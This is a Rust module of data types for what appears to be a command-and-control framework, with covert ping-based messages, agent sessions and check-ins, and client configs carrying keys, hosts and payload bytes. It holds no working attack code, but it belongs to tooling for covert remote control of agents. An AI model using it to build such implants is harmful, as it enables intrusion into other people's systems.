use std::{collections::HashMap, net::Ipv4Addr, time::Duration};

use serde::{Deserialize, Serialize};

/// Deserialized from multiple covert packets
#[derive(Serialize, Deserialize, Debug)]
pub enum PingMessage {
    DataMessage(Vec<u8>),
    SleepMessage(Duration),
    CloseMessage,
}

// #[allow(non_camel_case_types)]
// #[derive(Serialize, Deserialize, Debug)]
// pub enum Arch {
//     i686,
//     X86_64,
// }

#[derive(Deserialize, Serialize)]
pub struct ClientConfig<'a> {
    pub id: u16,
    pub key: [u8; 32],
    pub host: &'a str,
    pub pipe: &'a str,
    pub payload: &'a [u8],
    pub sleep: u64,
}

#[derive(Clone, Serialize, Deserialize)]
pub struct SessionData {
    pub last_checkin: Option<f64>,
    pub host: Option<Ipv4Addr>,
    pub arch: String,
}

impl SessionData {
    pub fn new(arch: &str) -> Self {
        SessionData {
            last_checkin: None,
            host: None,
            arch: arch.to_owned(),
        }
    }
}

pub type AgentSessions = HashMap<u16, SessionData>;

#[derive(Deserialize, Serialize, Clone)]
pub struct NewAgent {
    pub arch: String,
    pub sleep: u64,
    pub pipe: String,
    pub host: String,
}

#[derive(Deserialize, Serialize)]
pub struct PatchAgent {
    pub agentid: u16,
    pub sleep: Option<u64>,
}

#[derive(Deserialize, Serialize)]
pub struct DeleteAgent {
    pub agentid: u16,
}

pub const KEY_SIZE: usize = 32;
pub const BLOCK_SIZE: usize = 16;
pub const NUM_BLOCKS: usize = 17000;
pub const STAMP_BYTE: u8 = 0x01u8;
pub const BUF_SIZE: usize = (NUM_BLOCKS * BLOCK_SIZE) + KEY_SIZE;
